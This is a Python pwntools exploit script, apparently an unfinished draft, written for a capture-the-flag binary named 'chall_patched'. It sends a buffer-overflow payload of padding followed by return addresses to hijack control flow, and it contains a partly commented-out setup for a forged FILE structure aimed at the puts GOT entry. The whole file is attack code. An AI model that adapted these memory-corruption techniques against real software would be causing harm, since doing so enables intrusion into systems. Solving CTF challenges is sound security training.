#!/usr/bin/env python3

from pwn import *

exe = ELF("chall_patched")
libc = ELF("libc.so.6")
ld = ELF("ld.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r

r = conn()

sa   = lambda a,b : r.sendafter(a,b)
sla  = lambda a,b : r.sendlineafter(a,b)
sd   = lambda a,b : r.send(a,b)
sl   = lambda a : r.sendline(a)
ru   = lambda a : r.recvuntil(a, drop=True)
rc   = lambda : r.recv(4096)
uu32 = lambda data : u32(data.ljust(4, b'\0'))
uu64 = lambda data : u64(data.ljust(8, b'\0'))

restart = 0x00401090
nop = 0x000000000040101a#: ret

def main():

    fp = FileStructure()

    
    fp.flags = 0x00000000fbad2087
    fp._IO_read_ptr = exe.got["puts"]
    fp._IO_read_base = exe.got["puts"]
    fp._lock = 0x404400
    #read = fp.write(exe.got["puts"], 0x100)
    #print(fp)

    payload = b"AAAAAAAA"*5
    #payload += p64(nop)
    payload += p64(0x4010af)
    payload += p64(0x4011b8)
    payload += p64(restart)
    ##payload += p64(exe.got["puts"])
    ##payload += p64(restart)
    gdb.attach(r, gdbscript="b *0x4011b8\nb*0x40101a")
    sl(payload)
    #payload2 = p64(0x404030)
    #payload2 += p64(0)*3
    #payload2 += bytes(fp)
    #sl(payload2)
    r.interactive()


if __name__ == "__main__":
    main()
